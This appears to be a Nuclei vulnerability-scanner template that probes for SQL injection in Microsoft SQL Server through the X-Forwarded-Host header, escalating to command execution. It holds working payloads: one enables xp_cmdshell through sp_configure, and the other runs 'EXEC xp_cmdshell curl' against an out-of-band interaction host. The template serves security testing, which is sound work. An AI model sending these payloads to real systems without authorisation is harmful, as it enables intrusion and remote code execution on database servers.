http:
- matchers:
  - dsl:
    - contains(interactsh_protocol, 'http') || contains(interactsh_protocol, 'dns')
    type: dsl
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    X-Forwarded-Host: admin''exec(''sp_configure''''show advanced option'''',''''1''''reconfigure'')exec(''sp_configure''''xp_cmdshell'''',''''1''''reconfigure'')--

    '
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    X-Forwarded-Host: ''; EXEC xp_cmdshell ''curl {{interactsh-url}}'';--

    '
  req-condition: true
  stop-at-first-match: true
id: mssql-to-xfh-rce-bypass
info:
  author: reewardius
  name: MSSQL injection via X-Forwarded-For to RCE
  reference: https://infosecwriteups.com/how-i-escalated-a-time-based-sql-injection-to-rce-bbf0d68cb398
  severity: critical
  tags: rce,generic
